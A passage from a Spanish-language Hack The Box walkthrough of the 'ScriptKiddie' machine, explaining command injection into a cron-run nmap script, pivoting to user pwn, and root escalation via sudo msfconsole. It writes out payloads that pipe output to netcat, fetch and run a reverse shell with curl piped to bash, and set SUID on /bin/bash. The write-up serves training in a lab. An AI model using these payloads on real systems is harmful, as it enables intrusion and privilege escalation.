Ahora, como ya vimos que en la función **Sploit** realiza un filtro a la hora de poner algo que no sea texto, veamos que pasa si ponemos simbolos random:

<p align="center">
<img src="/assets/images/htb-writeup-scriptkiddie/Captura9.png">
</p>

Observa el resultado:
```bash
2023/05/08 02:19:47 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2023/05/08 02:20:01 CMD: UID=0     PID=446410 | /usr/sbin/cron -f 
2023/05/08 02:20:01 CMD: UID=0     PID=446409 | /usr/sbin/CRON -f 
2023/05/08 02:20:01 CMD: UID=0     PID=446408 | /usr/sbin/CRON -f 
2023/05/08 02:20:01 CMD: UID=0     PID=446418 | pkill -f keytool 
2023/05/08 02:20:01 CMD: UID=0     PID=446416 | /bin/sh -c pkill -f keytool && pkill -f nmap & rm -rf /tmp/d2* 
2023/05/08 02:20:28 CMD: UID=0     PID=446420 | /usr/sbin/incrond 
2023/05/08 02:20:28 CMD: UID=0     PID=446421 | /lib/systemd/systemd-udevd 
2023/05/08 02:20:28 CMD: UID=1001  PID=446428 | /bin/bash /home/pwn/scanlosers.sh 
2023/05/08 02:20:28 CMD: UID=1001  PID=446427 | sh -c nmap --top-ports 10 -oN recon/Tu_IP.nmap Tu_IP 2>&1 >/dev/null 
2023/05/08 02:20:28 CMD: UID=0     PID=446426 | /lib/systemd/systemd-udevd 
2023/05/08 02:20:28 CMD: UID=1001  PID=446429 | sh -c nmap --top-ports 10 -oN recon/Tu_IP.nmap Tu_IP 2>&1 >/dev/null 
2023/05/08 02:20:28 CMD: UID=1001  PID=446430 | wc -l 
2023/05/08 02:20:28 CMD: UID=0     PID=446431 | /usr/sbin/incrond 
2023/05/08 02:20:28 CMD: UID=1001  PID=446435 | /bin/bash /home/pwn/scanlosers.sh 
2023/05/08 02:20:28 CMD: UID=1001  PID=446434 | /bin/bash /home/pwn/scanlosers.sh 
2023/05/08 02:20:28 CMD: UID=1001  PID=446433 | /bin/bash /home/pwn/scanlosers.sh 
2023/05/08 02:20:28 CMD: UID=1001  PID=446432 | cat /home/kid/logs/hackers 
2023/05/08 02:20:28 CMD: UID=1001  PID=446437 | /bin/bash /home/pwn/scanlosers.sh 
```

Al parecer, ejecuta el script **scanlosers.sh** del **usuario pwn** (descubrimos otro usuario) y además nos esta aplicando un escaneo a nosotros, también parece que lee el **archivo hackers**, pero como nosotros no vimos que tuviera conteido, supongo que a de borrar lo que se le esta escribiendo.

Vamos a ver al usuario **pwn**.

### Enumeración de Usuario Pwn {#Maquina2}

Veamos si podemos ver su contenido:
```bash
kid@scriptkiddie:/home$ ls
kid  pwn
kid@scriptkiddie:/home$ cd pwn/
kid@scriptkiddie:/home/pwn$ ls -la
total 44
drwxr-xr-x 6 pwn  pwn  4096 Feb  3  2021 .
drwxr-xr-x 4 root root 4096 Feb  3  2021 ..
lrwxrwxrwx 1 root root    9 Feb  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 pwn  pwn   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 pwn  pwn  3771 Feb 25  2020 .bashrc
drwx------ 2 pwn  pwn  4096 Jan 28  2021 .cache
drwxrwxr-x 3 pwn  pwn  4096 Jan 28  2021 .local
-rw-r--r-- 1 pwn  pwn   807 Feb 25  2020 .profile
-rw-rw-r-- 1 pwn  pwn    74 Jan 28  2021 .selected_editor
drwx------ 2 pwn  pwn  4096 Feb 10  2021 .ssh
drwxrw---- 2 pwn  pwn  4096 Feb  3  2021 recon
-rwxrwxr-- 1 pwn  pwn   250 Jan 28  2021 scanlosers.sh
kid@scriptkiddie:/home/pwn$
```
Ahí esta, pero también hay un directorio llamado recon que no podemos entrar.

Vamos a ver el script:
```bash
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
kid@scriptkiddie:/home/pwn$
```
Ya voy entendiendo que esta pasando.

Al parecer, se utiliza el contenido del archivo **hackers** (que recordemos tiene la fecha actual y una IP, esto lo vimos en la función **Sploit**) para guardarlo dentro de la **variable log**, después lee esa variable para cortar los espacios en blanco y ocupa del tercer argumento en adelante lo que sea unico solamente, ahora aplica un while para leer la IP y con esto aplica el escaneo con **Nmap**

El problema aquí es el filtrado, hagamos una prueba para que entendamos el problema.

#### Probando Funcionamiento de Filtrado del Script scanlosers.sh para Inyectar Comandos {#Movida}

Vamos a ver como funciona el filtrado y como nos vamos a aprovechar de esto.

Hagamoslo por pasos:

* Utiliza la consola de **Python** en tu máquina para imprimir la fecha actual:
```python
python3                  
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import datetime
>>> f'[{datetime.datetime.now()}]'
'[2023-05-08 23:10:46.713999]'
```

* Copia el output, úsalo junto con el comando **echo**, agrégale tu IP y utiliza el filtrado:
```bash
echo "[2023-05-08 23:10:46.713999] Tu_IP" | cut -d' ' -f3- | sort -u
10.10.**.**
```
Vemos que se obtuvo solamente la IP, cortando la fecha. De esta forma funciona el filtro, para obtener solamente la IP que se guardo en el archivo **hackers**.

Ahora checa esto:

* Agrega el comando **whoami** después de la IP:
```bash
echo "[2023-05-08 23:10:46.713999] Tu_IP; whoami" | cut -d' ' -f3- | sort -u
10.10.**.**; whoami
```
No hay error, es decir, que puede que se ejecute sin problemas, lo que nos ayuda es el filtrado del **cut**, siendo él **-f3-** el que está haciendo el script vulnerable. 

Así que vamos a inyectar comandos dentro del script del usuario **pwn**.

Esta inyección ocurre aquí:
```bash
sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
```

Para ser más específicos, se colaría aquí:
```bash
nmap --top-ports 10 -oN recon/Tu_IP; whoami.nmap ${ip} 2>&1 >/dev/null
```

Obviamente esto nos dará un error, por lo que hay que agregar el símbolo **#** para que el siguiente comando esté comentado y se ejecute el que inyectamos, quedando así el Payload que vamos a utilizar:
```bash
"[2023-05-08 23:10:46.713999] Tu_IP o Maquina_IP; whoami #".
```
Excelente, ahora vamos a probar el Payload, utilizando el archivo **hackers** para inyectar algunos comandos.

#### Probando Inyección de Comandos en Script scanlosers.sh {#Payload}

Hagamos un par de pruebas para saber si esto funcionara:

* **Primer prueba**: Veamos que pasa si inyectamos el comando **whoami**. Para hacerlo, vamos al directorio en donde se encuentra el archivo **hackers** (recuerda que aca es donde posiblemente se guarde una IP y la fecha) y vamos a meter el Payload con el comando **echo**, el resultado lo vamos a mandar hacia nuestra máquina mediante **netcat**:
```bash
echo "[2023-05-08 23:10:46.713999] 10.10.10.226; whoami | nc Tu_IP 443 #" > hackers
```

* Ve el resultado en tu máquina:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.226] 48558
pwn
```
Muy bien, hagamos otra prueba.

* **Segunda prueba**: Vamos a lanzar una **traza ICMP** hacia nuestra máquina usando este método, obviamente debes alzar un capturador con la herramienta **tcpdump**:
```bash
kid@scriptkiddie:~/logs$ echo "[2023-05-08 23:10:46.713999] 10.10.10.226; ping -c 4 Tu_IP #" > hackers
[2023-05-08 23:10:46.713999] 10.10.10.226
PING 10.10.14.16 (10.10.14.16) 56(84) bytes of data.
64 bytes from Tu_IP: icmp_seq=1 ttl=63 time=130 ms
64 bytes from Tu_IP: icmp_seq=2 ttl=63 time=130 ms
64 bytes from Tu_IP: icmp_seq=3 ttl=63 time=131 ms
64 bytes from Tu_IP: icmp_seq=4 ttl=63 time=132 ms
--- 10.10.14.16 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004m
```

* Si observas el **tcpdump** verás que se recibieron, pero ¿qué pasara si tratamos de cambiar los permisos de la **Bash**? Intentémoslo:
```bash
kid@scriptkiddie:~/logs$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
kid@scriptkiddie:~/logs$ echo "[2023-05-08 23:10:46.713999] 10.10.10.226; chmod u+s /bin/bash #" > hackers
kid@scriptkiddie:~/logs$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```
No funciono, entonces lo que haremos será convertirnos en el usuario **pwn** mediante **Pivoting** y lo haremos de la misma forma con la que obtuvimos acceso la primera vez hacia el **usuario Kid**.

#### Convirtiendonos en Usuario pwn (Pivoting) {#Pwn}

Vamos por pasos:
* Utilizaremos el mismo archivo **index.html**, entonces abre un servidor en **Python** en donde este ese archivo:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Abre una **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

* Modifica el Payload agregando el comando **curl** y pipea **Bash**:
```bash
echo "[2023-05-08 23:10:46.713999] 10.10.10.226; curl Tu_IP/revShell | bash #" > hackers
```

* Cuando lo modifiques, ejecútalo y ve a la **netcat**:
```bash
nc -nvlp 443                            
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.226] 48562
bash: cannot set terminal process group (865): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ whoami
whoami
pwn
```
¡Listo! Ya somos el usuario **pwn**, ahora escalemos privilegios.

### Escalando Privilegios para ser Root con Metasploit Framework (Msfconsole) {#Root}

**IMPORTANTE**:

No tenemos una shell interactiva, hazla interactiva y continuas.

-----------

Veamos qué privilegios tenemos:
```bash
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

Bien, entremos a **Metasploit**:
```bash
pwn@scriptkiddie:~$ sudo msfconsole
...
```

Hay una forma de escalar privilegios con esta consola de **Metasploit** y es con **Ruby**, debemos activar **Ruby** para poder hacer cosillas:
```bash
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> system("whoami")
root
=> true
```

Y bien, podemos hacer dos cosas, cambiar los permisos de la **Bash** y/o entrar a la **Bash**:
```bash
>> system("chmod u+s /bin/bash")
=> true
>> system("bash")
root@scriptkiddie:/home/pwn# whoami
root
```

Y ya busca la flag:
```bash
root@scriptkiddie:/home/pwn# cd /root
root@scriptkiddie:~# ls -la
total 44
drwx------  7 root root 4096 Feb  3  2021 .
drwxr-xr-x 20 root root 4096 Feb  3  2021 ..
lrwxrwxrwx  1 root kid     9 Jan  5  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jan  5  2021 .cache
drwxr-xr-x  3 root root 4096 Jan  5  2021 .gem
lrwxrwxrwx  1 root root    9 Feb  3  2021 .lesshst -> /dev/null
drwxr-xr-x  3 root root 4096 Jan  5  2021 .local
drwxr-xr-x  9 root root 4096 Jan 28  2021 .msf4
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   75 Jan  5  2021 .selected_editor
lrwxrwxrwx  1 root root    9 Feb  3  2021 .viminfo -> /dev/null
-r--------  1 root root   33 May  8 20:23 root.txt
drwxr-xr-x  3 root root 4096 Jan 28  2021 snap
root@scriptkiddie:~# cat root.txt
...
```
Al fin, terminamos la máquina.
